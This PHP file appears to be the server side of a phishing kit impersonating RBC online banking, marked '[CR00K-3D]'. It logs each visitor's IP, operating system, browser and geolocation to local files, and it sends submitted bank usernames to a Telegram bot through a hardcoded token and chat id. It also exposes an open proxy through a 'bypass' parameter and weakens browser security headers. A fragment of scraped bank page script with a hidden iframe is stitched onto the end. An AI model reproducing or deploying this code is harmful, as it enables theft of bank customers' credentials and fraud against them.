<?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "RBC";
    $project    = "[CR00K-3D]";
    $url        = "https://RBC.com";
    $user       = $_POST['username'];
	$lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" $bank$lh$ip\n]nRBC USER/CARD\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$user\n\n\n---------------------\n\n";


$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
  "1456995"]);a.push(["setFirstParty","nova.collect.igodigital.com"]);b={};c&&(b.item=c);d&&(b.category=d);c&&a.push(["trackPageView",b])};a.src=("https:"==document.location.protocol?"https://":"http://")+"collect.rbcroyalbank.com/collect.js";var d=document.getElementsByTagName("script")[0];d.parentNode.insertBefore(a,d)}();</script><script type="text/javascript" id="">google_tag_manager["GTM-K5TWTL"].macro(36)(function(){var a=!1;-1!=window.location.search.indexOf("promo_name")&&(a=!0);a&&checkForPromoParameters()});function checkForPromoParameters(){var a=new URLSearchParams(window.location.search);dataLayer.push({event:"ecEvent",category:"Link Promotion",action:"click",label:a.get("promo_name"),ecommerce:{promoClick:{promotions:[{id:a.get("promo_id"),name:a.get("promo_name"),creative:document.referrer,position:a.get("promo_position")}]}}})};</script><iframe id="tdz_ifrm" title="empty" name="" width="0px" height="0px" marginwidth="0" marginheight="0" frameborder="0" aria-disabled="true" aria-hidden="true" tabindex="-1" src="https://h.online-metrix.net/Pn98Sfd_UBgs0Eud?7f09a559f9557684=tz5FEKI8YsdxDsvI0j_Wliqo1NHgO7Vm63Oggo7JZFjjR6glTSyzUlwzLzwXdtjkMqyPrYfLxyVBG5vOW1MAFRcAwFSGwWr5muEwialN9dMgPlY9zO3s55Auz-b5f-FeijjEZRUx22TfQ4QaQ3u-4Q&amp;hp=.co-operativebank.co.uk/CBIBSWeb/login.do.co-operativebank.co.uk/CBIBSWeb/start.do.de/portal/portal/x.entropay.com/basemenu/prot/x.facebook.comx.nationet.com/x.netbank.commbank.com.au/netbank/bankmainx.npbs.co.uk/netmastergoldbanking/x.nwolb.xlogin.aspx?refereridentx.rbsdigital.xAccountSummaryx.smile.co.uk/SmileWeb/login.do.smile.co.uk/SmileWeb/start.do.yandex.rux/CapitalOne_Consumer/x/easypay.by/x/sbank.ru/x53.com/servlet/efsonlinex://online.wellsfargo.com/x://secure.assist.ru/assistid/protected/main.doxabbeynational.co.uk/EBAN_ENS/BtoChannelDriverxalliance-leicesterxaltergold.com/login.phpxamericanexpress.com/myca/intl/acctsumm/emea/accountSummaryxbancaintesa.it/xbankcardservices.co.ukxbankofamerica.com/xbanquepopulaire.fr/xbnpparibas.net/xcahoot.comxcapitaloneonline.co.uk/CapitalOne_Consumer/Transactionsxcbonline.co.uk/ralu/reglm-web/setupSecurityQuestionPagexcibc.comxPreSignOnxcibc.comxSignOnxcitibank.ru/xclient.uralsibbank.ruxco-operativebank.co.uk/CBIBSWeb/loginSpixcommerceonlinebanking.comxcoventrybuildingsociety.co.ukxdeutsche-bank.dexdiscovercard.com/cardmembersvcs/strongauth/app/sa_mainxebanking.bawag.comxebc_ebc1961xegg.com/customer/movemoneyxegg.com/customer/yourmoneyxfacebook.com/xhalifax-online.co.ukxMyAccountsxhalifax-online.co.uk/x/Mhalifax-online.co.uk/personalxhsbc.co.uk/1/2/personal/internet-banking/xhsbc.comxhttps://banking.postbank.de/app/finanzstatus.init.do;jsessionidxib.fineco.it/FinecoWeb/BonificiServletxib.fineco.it/FinecoWeb/jsp/Main/HBFineco.jspxib.fineco.it/FinecoWeb/jsp/Main/Principale.jspxibank.alfabank.ruxin-biz.it/xipko.plxlibertyreserve.com/x/historylibertyreserve.com/x/loginwww.libertyreserve.com/x/Core.jswww.libertyreserve.com/x/transfer.libertyreserve.com/x/commonscript.jslloydstsb.co.uk/personal/a/account_overview/xmbna.co.ukxmenyala.ruxmoney.yandex.ruxmoneybookers.com/app/login.plxmoneymail.ruxmy.ebay.co.uk/ws/eBayISAPI.dll?MyEbayxmy.ebay.com/ws/eBayISAPI.dll?MyEbayxmy.ebay.fr/ws/eBayISAPI.dll?MyEbayxmybusinessbank.co.ukxnationet.com/AppServices/SignOn/SignOnProcess/RcaSignOnxnpbs.co.ukxnwolb.com/AccountSummaryxnwolb.com/Statementsxnwolb.com/TransfersLandingPagexoltx.fidelity.com/x/x/ofsummary/summaryxonline.lloydstsb.co.ukxonlinebanking.mandtbank.com/summary/AccountSummaryxpassport.yandex.ruxpaypal.com/x/cgi-bin/webscr?cmd=_accountxpaypal.com/x/cgi-bin/webscr?cmd=_login-done&amp;login_access=xpaypal.com/us/cgi-bin/webscr?cmd=_login-done&amp;login_access=xposte.it/xpsk.co.at/xsecure.lloydstsb.co.uk/personal/a/account_overviewxsmile.co.uk/SmileWeb/passcodexusaa.com/xusbank.com/internetBanking/RequestRouter?requestCmdId=Gxwachovia.comxybonline.co.uk/ralu/reglm-web/setupSecurityQuestionPagex.amazon.fr/xhistory/orders/view.htmlx.banquepopulaire.frxShowPortal.dox.bnpparibasfortis.bexHome_Logon.aspx.cdiscount.com/Account/Home.aspxx.cmb.frxaccueil.jspx.credit-agricole.frxentreeBam?sessionSAGx.labanquepostale.fr/xreleveCPP-releve_ccp.eax.secure.bnpparibas.net/NSFR?Actionx.secure.lcl.frxAccueilxcredem.it/OneToOne/ebank/functionsxmijn.ing.nl/xonline.ybs.co.ukxwww.discover.com/xorder.cdiscount.comxCustomer.aspxxsealinfo.verisign.com/splash?form_filexvos-comptes.credit-du-nord.fr/CDC_TableauDeBord_0.asp?xvoscomptesenligne.labanquepostale.frxwww.x.caisse-epargne.fr/Portail.aspxxwww.exabanque.netxonglet.phpxdeutsche-bank.de/xnorisbank.de/xpostbank.de/xtargobank.de/x.x.de/portal/x.bankofamerica.com/x/commonscript.js.bmo.com/OLB?id=x.bmo.com/RMC?id=x.chase.com/x.aspxx.chase.com/js/Reporting.jsx.koodomobile.com/account/selfserve/x/xaccountId=x.payment.ru/x.scotiabank.com/portal/index.jsp?xbancopopular.es/empresasxcreval.it/login2007/loginSiciliano.aspxfirst-direct.com/xipko.plxmybusinessbank.co.ukxsanpaoloimi.com/xulsterbankanytimebanking.x/login.aspxx" style="display: none !important; z-index: -9999 !important; visibility: hidden !important;"></iframe></body></html>